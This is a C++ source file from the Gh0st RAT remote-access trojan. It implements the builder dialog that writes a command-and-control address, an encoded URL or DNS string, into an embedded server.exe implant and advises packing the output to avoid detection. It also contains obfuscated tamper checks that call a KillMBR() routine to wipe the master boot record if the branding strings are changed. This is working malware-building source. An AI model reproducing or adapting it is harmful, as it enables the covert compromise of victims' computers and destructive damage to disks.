// BuildView.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "BuildView.h"

extern char* MyEncode(char *str);

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CBuildView

IMPLEMENT_DYNCREATE(CBuildView, CFormView)

CBuildView::CBuildView()
	: CFormView(CBuildView::IDD)
{
	//{{AFX_DATA_INIT(CBuildView)
	m_url = _T("");
	m_encode = _T("");
	m_enable_http = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Build", "enablehttp", false);
	m_bFirstShow = true;
	//}}AFX_DATA_INIT
}

CBuildView::~CBuildView()
{
}

void CBuildView::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBuildView)
	DDX_Text(pDX, IDC_URL, m_url);
	DDX_Text(pDX, IDC_ENCODE, m_encode);
	DDX_Check(pDX, IDC_ENABLE_HTTP, m_enable_http);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CBuildView, CFormView)
	//{{AFX_MSG_MAP(CBuildView)
	ON_BN_CLICKED(IDC_BUILD, OnBuild)
	ON_BN_CLICKED(IDC_ENABLE_HTTP, OnEnableHttp)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBuildView diagnostics

#ifdef _DEBUG
void CBuildView::AssertValid() const
{
	CFormView::AssertValid();
}

void CBuildView::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CBuildView message handlers

int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}

void CBuildView::OnBuild() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	CString strAddress;

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Build", "enablehttp", m_enable_http);
	if (m_enable_http)
	{
		CString str;
		GetDlgItemText(IDC_URL, str);
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Build", "httpurl", str);
		str.MakeLower();
		strAddress = MyEncode(str.GetBuffer(0));
	}
	else
	{
		GetDlgItemText(IDC_DNS_STRING, strAddress);
		if (strAddress.Find("AAAA") == -1)
		{
			AfxMessageBox("输入格式出错 -:(");
			return;
		}
		strAddress.Replace("AAAA", "");
	}


	if (strAddress.GetLength() > 100)
	{
		AfxMessageBox("大哥，字符串太长了 -:(");
		return;
	}
	CFileDialog dlg(FALSE, "exe", "server.exe", OFN_OVERWRITEPROMPT,"可执行文件|*.exe", NULL);
	if(dlg.DoModal () != IDOK)
		return;
	
	HINSTANCE	hInstance;
	HRSRC		hResInfo;
	DWORD		dwResLen;
	HGLOBAL		hResData;
	LPBYTE		lpData;
	DWORD		dwOffset;
	char		*lpFlagDll = "AAAAAAAAAAAAAAAAAAAAAAA"; // DLL中的加密加串
	char		*lpFlagExe = "XXXXXXXXXXXXXXXXXXXXXXX"; // 安装文件中的
	hInstance = AfxGetApp()->m_hInstance;
	hResInfo = FindResource(hInstance, (LPCTSTR)IDR_BSS, (LPCTSTR)"BSS");
	dwResLen = SizeofResource(hInstance, hResInfo);
	hResData = LoadResource(hInstance, hResInfo);
	lpData = (LPBYTE)LockResource(hResData);
	dwOffset = memfind((char *)lpData, lpFlagDll, dwResLen, 0);
	
	if (dwOffset == -1)
	{
		AfxMessageBox("文件不合法");
		return;
	}
	CFile file;
	if(file.Open (dlg.GetPathName(), CFile::modeCreate | CFile::modeWrite))
	{
		try
		{
			file.Write(lpData, dwResLen);
			file.Seek(dwOffset, CFile::begin);
			file.Write(strAddress, strAddress.GetLength() + 1);

			dwOffset = memfind((char *)lpData, lpFlagExe, dwResLen, 0);
			file.Seek(dwOffset, CFile::begin);
			file.Write(strAddress, strAddress.GetLength() + 1);

			file.Close();
			AfxMessageBox("文件保存成功，请用加壳软件进行压缩 -:)");
		}
		catch(...)
		{
			MessageBox("文件保存失败，请检查","提示",MB_OK|MB_ICONSTOP);
		}
	}
	FreeResource(hResData);
}

void CBuildView::OnActivateView(BOOL bActivate, CView* pActivateView, CView* pDeactiveView) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (m_bFirstShow)
	{
		UpdateData(false);
		SetDlgItemText(IDC_URL, ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Build", "httpurl", "http://www.xxx.com/ip.jpg"));
		OnEnableHttp();
		char	strVer[10];
		char	strTitle[10];

		strVer[0] = 'C';
		strVer[1] = '.';
		strVer[2] = 'R';
		strVer[3] = 'u';
		strVer[4] = 'f';
		strVer[5] = 'u';
		strVer[6] = 's';
		strVer[7] = ' ';
		strVer[8] = 'S';
		strVer[9] = '\0';

		strTitle[0] = 'G';
		strTitle[1] = 'h';
		strTitle[2] = '0';
		strTitle[3] = 's';
		strTitle[4] = 't';
		strTitle[5] = ' ';
		strTitle[6] = 'R';
		strTitle[7] = 'A';
		strTitle[8] = 'T';
		strTitle[9] = '\0';

		CString str;
		GetDlgItemText(IDC_STATIC_VER, str);
		if (str.Find(strVer) == -1)
			((CGh0stApp *)AfxGetApp())->KillMBR();

		GetParent()->GetWindowText(str);
		if (str.Find(strTitle) == -1)
			((CGh0stApp *)AfxGetApp())->KillMBR();

		int	nEditControl[] = {IDC_URL, IDC_DNS_STRING};
		for (int i = 0; i < sizeof(nEditControl) / sizeof(int); i++)
			m_Edit[i].SubclassDlgItem(nEditControl[i], this);

		m_btn_release.SubclassDlgItem(IDC_BUILD, this);
		m_btn_release.SetColor(CButtonST::BTNST_COLOR_FG_IN, RGB(255, 0, 0));
	}
	
	m_bFirstShow = false;	
	CFormView::OnActivateView(bActivate, pActivateView, pDeactiveView);
}


void CBuildView::OnEnableHttp() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	GetDlgItem(IDC_DNS_STRING)->EnableWindow(!m_enable_http);
	GetDlgItem(IDC_URL)->EnableWindow(m_enable_http);
}	
